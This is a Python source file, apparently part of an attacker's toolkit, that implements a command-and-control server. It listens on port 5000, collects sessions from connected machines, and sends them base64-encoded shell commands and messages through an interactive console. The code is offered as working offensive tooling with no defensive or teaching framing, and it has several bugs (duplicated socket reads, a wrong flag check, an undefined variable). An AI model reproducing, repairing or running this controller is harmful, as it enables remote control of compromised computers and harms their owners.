'''
Author : ISSAC
Github : https://github.com/malbuffer4pt/IssacTools
'''

import socket
import threading
import base64

host = '0.0.0.0'
port = 5000
conn_list = []
recv_resume = True
get_session_resume = True

def b64_enStr(data):
    return base64.b64encode(data.encode()).decode()

def b64_deStr(data):
    return base64.b64decode(data.encode()).decode()

def session_id_arrangement():
    if len(conn_list) > 0:
        if len(conn_list) == 1:
            conn_list[0][0] = "1"
        else:
            for i in range(0, len(conn_list)):
                conn_list[i][0] = str(i + 1)
    return

def get_session(s):
    while True:
        if get_session:
            try:
                conn, addr = s.accept()
                conn_list.append([len(conn_list) + 1, conn, addr])
                print('New session : ' + str(addr))
            except:break
        else:break
    return
        
def drop_session(session_id):
    conn = conn_list[int(session_id) - 1][1]
    conn.close()
    del conn_list[int(session_id) - 1]
    session_id_arrangement()
    return 0

def conn_recv(conn):
    while True:
        if recv_resume:
            try:
                if (len(conn.recv(1024)) != 0):
                    data = conn.recv(1024).decode()
                    print(data)
                    if "|" in data:
                        data_split = data.split('|')
                        if data_split[0] == "msg":
                            pass
                    else:print("[+] Received Data:\n" + data)
                else:break
            except:
                break
        else:
            print(".")
            break
    return

def send_msg(conn):
    while True:
        msg = input("msg/> ")
        if (msg != "exit"):
            b64_msg = base64.b64encode(msg.encode()).decode()
            conn.send(("msg|" + b64_msg).encode())
        else:
            break;
    return

def os_shell(session_id):
    #Initialization
    conn = conn_list[int(session_id) - 1][1]
    conn.send("getos".encode())
    addr = conn_list[int(session_id) - 1][2]
    print(addr)
    #Shell interactive
    while True:
        cmd = input("Shell(%s)/> " % str(addr))
        if cmd != "exit":
            b64_cmd = base64.b64encode(cmd.encode()).decode()
            conn.send(("shell|" + b64_cmd).encode())
        else:
            break
    return

def cmd_handler(cmd, session_id):
    conn = conn_list[int(session_id) - 1][1]
    cmd_split = cmd.split(' ')
    if (len(cmd_split) > 0):
        if (cmd_split[0] == 'msg'):
            send_msg(conn)
        elif (cmd_split[0] == 'shell'):
            os_shell(session_id)
        else:
            print("[-] Unknown command : " + cmd)
            
def session_handler(cmd_split):
    conn = None
    session_id = None
    if cmd_split[1] == "list":
        for c in conn_list:
            print("[+] %s : %s" % (str(c[0]), str(c[2])))
    elif cmd_split[1] == "info":
        if session_id != None:
            print("%s : %s" % (session_id, conn_list[int(session_id) - 1][2]))
        else:print("[-] No session in used...")
    elif cmd_split[1] == "drop":
        if len(conn_list) > 0:
            if len(cmd_split) == 2 and conn == None:
                print("[-] No session in used, you cannot drop 'current session'")
            else:
                if len(cmd_split) == 2:
                    if drop_session(session_id) == 0:
                        print("[+] Drop session %s successfully" % session_id)
                        session_id = None
                        conn = None
                    else:print("[-] Drop session %s failed!" % sid)
                elif len(cmd_split) == 3:
                    try:
                        sid = int(cmd_split[2])
                        if (sid <= len(conn_list)):
                            if drop_session(sid) == 0:
                                print("[+] Drop session %s successfully" % sid)
                                session_id = None
                                conn = None
                            else:print("[-] Drop session %s failed!" % sid)
                        else:print("[-] Invalid session id : %s" % sid)
                    except Exception as e:
                        print("[-] %s" % e)
                else:print(len(cmd_split))
        else:print("[-] No session in list, you drop nothing!")
    elif cmd_split[1] == "help":print("[-] Unknown command : " + cmd_split[1])
    return (conn, session_id)

def do_interactive(s):
    conn = None
    session_id = None
    while True:
        try:
            cmd = input("command(%s:%s)/>" % (session_id if session_id != None else "", conn_list[int(session_id) - 1][2] if session_id != None else ""))
            cmd_split = cmd.split(' ')
            if cmd_split[0] == "session":
                if len(cmd_split) > 1:
                    result = session_handler(cmd_split)
                    conn = result[0]
                    session_id = result[1]
            elif cmd_split[0] == "use":
                conn = conn_list[int(cmd_split[1]) - 1][1]
                session_id = int(cmd_split[1])
                print(str(conn))
                threading.Thread(target=conn_recv, args=(conn,)).start()
            elif cmd_split[0] == "exit":
                print("[*] Exit")
                for conn in conn_list:
                    conn[1].close()
                s.close()
                print("[+] Socket close")
                break
            else:
                if conn != None:
                    cmd_handler(cmd, session_id=session_id)
                else:
                    print("[-] No session in used...")
        except Exception as e:
            print("[-] Run error : %s" % e)
    return

def main():
    s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    s.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
    s.bind((host, port))
    s.listen(5)
    print("[*] Wait for connection")
    thd_list = [
        threading.Thread(target=get_session, args=(s,)),
        #threading.Thread(target=do_interactive, args=(s,)),
    ]
    for thd in thd_list:thd.start()
    do_interactive(s)
    
if __name__ == "__main__":
    main()